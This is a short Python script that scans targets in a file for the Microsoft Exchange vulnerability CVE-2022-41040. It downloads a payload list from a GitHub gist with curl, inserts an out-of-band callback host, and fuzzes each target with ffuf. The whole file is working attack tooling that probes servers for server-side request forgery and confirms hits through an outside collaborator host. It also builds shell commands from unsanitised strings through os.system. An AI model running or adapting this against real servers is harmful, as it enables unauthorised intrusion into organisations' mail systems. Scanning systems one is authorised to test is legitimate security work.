'''
Microsoft Exchange Server Elevation of Privilege Vulnerability.
'''
import os
import argparse

# Get the payloads
os.system("curl -s https://gist.githubusercontent.com/kljunowsky/a2e8392f63fb8d7c0443f2011bce59ec/raw/7b4cabaa0dab7113b1cab00e1a2cb0c4e3c6ed06/cve-2022-41040-unfurl-payloads.txt > payloads.txt")

# Read the OOB-PAYLOAD
parser = argparse.ArgumentParser()
parser.add_argument("-oob", "--oob-payload", help="OOB-PAYLOAD")
args = parser.parse_args()
oob_payload = args.oob_payload

# Replace COLLABHERE with OOB-PAYLOAD
with open("payloads.txt", "r") as f:
    payloads = f.read().splitlines()
payloads = [payload.replace("COLLABHERE", oob_payload) for payload in payloads]

# Open file to write final payloads
with open("fuzz-ready.txt", "w") as f:
    for payload in payloads:
        os.system(f"cat targets.txt | unfurl format {payload} >> fuzz-ready.txt")

# Execute ffuf command
os.system("ffuf -w fuzz-ready.txt -u FUZZ")